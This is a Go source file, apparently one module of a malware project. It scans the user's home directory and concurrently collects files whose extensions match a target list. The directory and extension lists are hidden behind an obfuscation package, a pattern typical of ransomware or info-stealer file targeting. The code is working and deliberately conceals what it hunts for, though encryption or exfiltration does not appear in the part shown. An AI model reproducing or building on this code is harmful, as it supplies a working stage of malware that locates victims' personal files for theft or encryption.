package walk

import (
	"os"
	"path/filepath"
	"sync"
	"lawk/pkg/obf"
)


func Walk() ([]string, error) {
	homeDir, err := os.UserHomeDir()
	if err != nil {
		return nil, err
	}
	targetDirs := make([]string, 0, 11)
	for i := range [11]int{} { 
		dirName, err := obf.Get(i)
		if err != nil {
			return nil, err
		}
		fullPath := filepath.Join(homeDir, dirName)
		if _, err := os.Stat(fullPath); err == nil {
			targetDirs = append(targetDirs, fullPath)
		}
	}

	targetExts := make([]string, 0, 26)
	for i := range [26]int{} { 
		ext, err := obf.Get(i + 11)
		if err != nil {
			return nil, err
		}
		targetExts = append(targetExts, ext)
	}

	extMap := make(map[string]bool)
	for _, ext := range targetExts {
		extMap[ext] = true
	}

	var foundFiles []string
	var mu sync.Mutex
	var wg sync.WaitGroup

	for _, dir := range targetDirs {
		wg.Add(1)
		go func(directory string) {
			defer wg.Done()
			filepath.Walk(directory, func(path string, info os.FileInfo, err error) error {
				if err != nil || info.IsDir() {
					return nil 
				}
				if extMap[filepath.Ext(info.Name())] {
					mu.Lock()
					foundFiles = append(foundFiles, path)
					mu.Unlock()
				}
				
				return nil
			})
		}(dir)
	}

	wg.Wait()
	return foundFiles, nil
}
